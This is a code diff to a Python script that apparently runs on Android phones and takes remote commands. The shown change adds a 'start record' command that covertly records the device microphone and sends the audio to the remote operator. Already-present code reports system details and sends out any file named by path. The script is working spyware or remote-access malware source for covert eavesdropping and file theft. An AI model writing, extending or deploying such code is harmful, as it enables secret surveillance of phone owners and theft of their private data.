@@ -1,4 +1,5 @@
-import time,subprocess,requests,os,platform,sys
+import time,subprocess,requests,os,platform,sys,threading
+from jnius import autoclass
 
 def send_message(message):
     try:
@@ -54,6 +55,28 @@ def notify_internet():
             time.sleep(0.5)
     except Exception as error: return {'ok':False,'result':error}
 
+def start_recording(sec=10):
+    try:
+        time.sleep(3)
+        send_message(f'Recording {sec}s...')
+        file = '/storage/emulated/0/audio.mp4'
+        MediaRecorder = autoclass('android.media.MediaRecorder')
+        recorder = MediaRecorder()
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+        recorder.setOutputFile(file)
+        recorder.prepare()
+        recorder.start()
+        time.sleep(sec)
+        recorder.stop()
+        recorder.release()
+        send_audio(file,'Recorded successfully')
+        return {'ok': True, 'result': file}
+    except Exception as error:
+        send_message(f'Recording Failed: `{error}`')
+        return {'ok': False, 'result': str(error)}
+
 def gen_response(cmd):
     try:
         parts = cmd.strip().split()
@@ -62,6 +85,11 @@ def gen_response(cmd):
         main = parts[0]
         if cmdlen == 1 and main.lower() == 'active': return {'result':f'`{device}` is active','type':'message'}
         elif cmdlen == 1 and main.lower() == 'sysinfo': return {'result':f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`','type':'message'}
+        elif cmdlen == 3 and main.lower() == 'start':
+            if parts[1] == 'record':
+                threading.Thread(target=start_recording,args=(int(parts[2]),),daemon=True).start()
+                return {'result':'`record` request sended','type':'message'}
+            else: return {'result':'invalid option for `start`','type':'message'}
         elif cmdlen == 3 and main.lower() == 'send':
             if not os.path.exists(parts[2]): return {'result':f'*status:* path not found `{parts[2]}`','type':'message'}
             file_details = subprocess.getoutput(f'stat {parts[2]}')
